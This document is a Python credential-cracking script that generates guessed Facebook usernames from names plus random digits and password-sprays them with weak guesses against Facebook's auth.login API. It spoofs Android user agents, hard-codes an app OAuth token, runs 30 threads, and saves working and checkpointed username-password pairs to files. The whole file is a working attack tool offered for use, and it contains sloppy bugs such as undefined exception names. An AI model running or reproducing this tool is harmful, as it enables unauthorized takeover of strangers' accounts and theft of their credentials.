'''RAMXAN__TRT'''

import os,random,uuid,httpx,sys,string,time
from concurrent.futures import ThreadPoolExecutor as RamxanTRT

C = "\033[0;96m"
P = "\033[0;97m"
A = "\033[1;32m"
Q = "\033[0;91m"
L = "\x1b[38;5;205m"
Y = "\033[1;93m"
E = "\033[1;97m"

successfull=[]
checkpoint=[]
loop=0

Z = "TRT"
T = "Tariq"
M = "Musa"
H = "Awais"
S = "Sohail"
V = "Smir"
J = "Ali"
K = "Khan"
U = "Etc"
X = "Ramzan"
F = "User"
G = "Name"
logo = f"""
\x1b[1;97m
    88888888888 8888888b. 88888888888 
        888     888   Y88b    888     
        888     888    888    888     
        888     888   d88P    888     
        888     8888888P"     888     
        888     888 T88b      888     
        888     888  T88b     888     
        888     888   T88b    888\033[1;32m      XD
\x1b[1;91m-----------------------------------------------
{Y}[~]{E} Author   : {X} {K}
{Y}[~]{E} Facebook : {X} {K}
{Y}[~]{E} Tool     : {F}{G}
\x1b[1;91m-----------------------------------------------"""



'''---------------------------useragent---------------------'''

def useragent():
	model2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
	TRT  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+f";[FBAN/"+"FB4A;FBAV/196.0.0.{random.randint(10, 99)};FBBV/"+"311606716;FBDM/"+"{density=2.75,width=1080,height=1};FBLC/"+"fr_FR;FBRV/{random.randint(100000000, 999999999)};FBCR/"+"F-Bouygues Telecom;FBMF/"+"Xiaomi;FBBD/"+"xiaomi;FBPN/"+"com.facebook.katana;FBDV/"+"Mi Note 10 Lite;FBSV/"+"8.1.0;FBOP/"+"1;FBCA/"+"armeabi-v7a:armeabi;]"
	ua = random.choice([f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))",])+TRT
	return ua
'''--------------------------------------------------------------------'''

def fb_usernames():
    os.system('clear');print(logo)
    user=[]
    print(f"{Y}For Example : {T}, {V}, {M}, {H},{S}")
    first = input(f'{P}First Name : ')
    print(f"{Y}For Example : {J}, {K}, {U}")
    last = input(f'{P}Last Name :  ')
    period = '.'
    try:
        print(f"{Y}For Example : 1000, 2000, 5000, 10000 ")
        limit=int(input(f'{P}How Many Usernames Do You Want To Add ? : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with RamxanTRT(max_workers=30) as TRT:
        total=str(len(user))
        os.system("clear");print(logo)
        print('\033[1;37mThe process is running in the background')
        print(f'Total ids: {A}'+total)
        print("\x1b[1;97m-----------------------------------------------")
        for digitx in user:
            username=first+period+last+digitx
            pswrd = [first,last,first+last,first+'123',first+'1234',first+'12345',last+'123',last+'1234',last+'12345']
            TRT.submit(processcrack,username,pswrd,total)
    print(50 * '\033[0;97m-')
    print('Program finished! ')
    print(f"Total OK; {len(successfull)}") 
    print(f"Total OK; {len(checkpoint)}")
    print(50 * '-')
    input(" [ PRESS ENTER TO BACK ] ") 
    fb_usernames()
    

def processcrack(username,pswrd,total):
    global successfull
    global checkpoint
    uaa = useragent()
    global loop
    sys.stdout.write(f"\r\033[0;97m[{Z}\033[0;97m]  {loop} |  {A}OK:-{len(successfull)} {Q}CP:-{len(checkpoint)} {''.format(loop/float(total))} ")
    try:
        for password in pswrd:
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            connection={'adid': adid,
           'format': 'json',
           'device_id': device_id,
           'email': username,
           'password': password, 
           'generate_analytics_claims': '1',
           'credentials_type': 'password',
           'source': 'login', 
           'error_detail_type': 'button_with_disabled',
           'enroll_misauth': 'false', 
           'generate_session_cookies': '1',
           'generate_machine_id': '1',
           'meta_inf_fbmeta': '', 
           'currently_logged_in_userid': '0',
            'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': uaa, 
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': '21435', 
            'X-FB-Net-HNI': '35793',
            'X-FB-SIM-HNI': '37855', 
            'X-FB-Connection-Type': 'unknown', 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger'}
            login_url='https://api.facebook.com/method/auth.login'
            req=httpx.post(login_url,data=connection,headers=header).json()
            if 'session_key' in req:
                print(f'\r\r\033[1;32m [TRT-OK] '+username+' | '+password)
                open('/sdcard/TRT/OK.txt', 'a').write(username+' | '+password+'\n')
                successfull.append(username)
                break
            elif 'www.facebook.com' in req['error_msg']:
                print(f'\r\r\x1b[38;5;205m [TRT-CP] '+username+' | '+password)
                open('/sdcard/TRT/CP.txt', 'a').write(username+' | '+password+'\n')
                checkpoint.append(username)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        	time.sleep(20)
        
        
    except exceptions:
        pass
        

fb_usernames()
  


